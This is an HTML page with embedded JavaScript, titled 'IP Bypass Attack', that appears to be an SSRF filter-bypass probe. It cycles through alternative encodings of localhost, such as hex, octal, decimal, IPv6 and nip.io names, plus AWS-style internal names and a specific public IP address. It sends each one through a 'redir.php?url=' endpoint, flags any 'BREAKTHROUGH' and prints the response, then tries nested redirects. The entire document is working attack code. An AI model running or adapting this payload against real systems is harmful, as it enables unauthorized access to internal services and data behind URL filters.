<!DOCTYPE html>
<html>
<head>
    <title>IP Bypass Attack</title>
</head>
<body>
    <h1>üéØ IP Address Bypass Attack</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Alternative IP representations to bypass localhost filtering
        var ipVariations = [
            // Standard localhost representations
            '127.0.0.1',
            '127.1',
            '127.000.000.001', 
            '0.0.0.0',
            
            // Hex representations
            '0x7f000001',      // 127.0.0.1 in hex
            '0x7f.0x0.0x0.0x1',
            
            // Octal representations  
            '0177.0.0.1',      // 127 in octal
            '017700000001',    // Full octal
            
            // Decimal representation
            '2130706433',      // 127.0.0.1 as decimal
            
            // IPv6 localhost
            '[::1]',
            '[0:0:0:0:0:0:0:1]',
            
            // Alternative localhost formats
            'localhost.localdomain',
            '127.0.0.1.xip.io',
            '127.0.0.1.nip.io',
            
            // Internal hostname possibilities
            'ip-172-31-',      // Common AWS internal naming
            'localhost',       // Try again to confirm
            
            // Try the actual server IP internally
            '54.209.100.76'
        ];
        
        for(var i = 0; i < ipVariations.length; i++) {
            try {
                results += "<h3>üîç Testing: " + ipVariations[i] + "</h3>";
                
                // Test basic connection first
                var xhr1 = new XMLHttpRequest();
                xhr1.open('GET', 'http://localhost/redir.php?url=http://' + ipVariations[i] + '/', false);
                xhr1.send();
                
                if(xhr1.responseText && xhr1.responseText.length > 5) {
                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>üéØ BREAKTHROUGH: " + ipVariations[i] + " works! (" + xhr1.responseText.length + " bytes)</div>";
                    results += "<div style='background:#f0f0f0;padding:10px;max-height:100px;overflow:scroll;font-size:10px;'>" + xhr1.responseText.substring(0, 300) + "</div>";
                    
                    // If basic connection works, try accessing redir.php on that IP
                    try {
                        var xhr2 = new XMLHttpRequest();
                        xhr2.open('GET', 'http://localhost/redir.php?url=http://' + ipVariations[i] + '/redir.php?url=https://www.google.com', false);
                        xhr2.send();
                        results += "<div style='background:#ffff99;padding:5px;'>üîÑ Nested redir test: " + xhr2.responseText.length + " bytes</div>";
                    } catch(e2) {
                        results += "<div style='background:#ffeaa7;padding:3px;'>‚ö†Ô∏è Nested failed: " + e2.message.substring(0, 50) + "</div>";
                    }
                    
                } else {
                    results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå No response</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå " + e.message.substring(0, 50) + "</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
